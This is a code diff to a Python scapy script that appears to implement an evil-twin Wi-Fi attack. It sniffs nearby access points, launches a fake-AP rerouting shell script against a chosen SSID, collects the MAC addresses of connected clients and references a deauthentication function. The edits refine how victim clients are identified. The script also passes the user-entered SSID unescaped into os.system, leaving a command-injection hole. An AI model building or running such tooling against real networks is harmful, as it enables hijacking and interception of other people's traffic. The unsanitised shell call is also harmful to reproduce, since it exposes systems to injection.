@@ -15,6 +15,7 @@ networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "
 networks.set_index("BSSID", inplace=True)
 
 isSniffing = True
+isPrinting = True
 
 bssid_to_scan = ''
 clients = set()
@@ -40,7 +41,7 @@ def callback(packet):
 
 
 def print_APs():
-    while isSniffing:
+    while isPrinting:
         os.system("clear")
         print(networks)
         time.sleep(0.5)
@@ -63,17 +64,24 @@ def change_channel():
 
 
 def get_AP_clients(pkt):
-    if pkt.haslayer(Dot11):
-        client_mac = ''
-        if pkt.type == 2:
-            from_ds = pkt[Dot11].FCfield & 0x1 != 0
-            to_ds = pkt[Dot11].FCfield & 0x2 != 0
-            if to_ds and not from_ds and pkt.addr2 == bssid_to_scan:
-                client_mac = pkt.addr1
-            if from_ds and not to_ds and pkt.addr1 == bssid_to_scan:
-                client_mac = pkt.addr2
-            if client_mac:
-                clients.add(client_mac)
+    valid_bssid = [bssid_to_scan]
+    if pkt.haslayer(Dot11) and pkt.type == 2:
+        client_mac = None
+        DS = pkt.FCfield & 0x3
+        to_ds = DS & 0x01 != 0
+        from_ds = DS & 0x2 != 0
+        # print (f"pkt[Dot11].FCfield: {pkt[Dot11].FCfield}")
+        # print (f"from_ds: {from_ds}, to_ds: {to_ds}")
+        # print (f"pkt.addr1: {pkt.addr1}, pkt.addr2: {pkt.addr2}, pkt.addr3: {pkt.addr3}")
+        if to_ds and not from_ds and pkt.addr1 in valid_bssid:
+            client_mac = pkt.addr2
+        elif from_ds and not to_ds and pkt.addr2 in valid_bssid:
+            client_mac = pkt.addr3
+        elif not from_ds and not to_ds and pkt.addr1 in valid_bssid:
+            client_mac = pkt.addr2
+
+        if client_mac:
+            clients.add(client_mac)
 
 
 def deauth_target(target_mac, twin_mac):
@@ -95,9 +103,9 @@ if __name__ == "__main__":
     print("Start scanning networks")
     # start sniffing
     sniff(prn=callback, monitor=True, timeout=10)
-    isSniffing = False
+    isPrinting = False
 
-    print("Enter ssid address of AP to sacn")
+    print("Enter ssid address of AP to scan: ")
 
     ssid_to_scan = input()
     bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
@@ -108,7 +116,8 @@ if __name__ == "__main__":
     os.system(f"./rerouting_magic.sh --ap {fake_ap} --net {net_ap} --ssid {ssid_to_scan}")
 
     print(f'Start scanning clients on {bssid_to_scan}')
-    sniff(prn=get_AP_clients, monitor=True, stop_filter=lambda x: len(clients) > 0, timeout=120)
+    sniff(prn=get_AP_clients, monitor=True, timeout=20)
+    isSniffing = False
 
     print(f"clients connected to the AP you choose: {clients}")
 
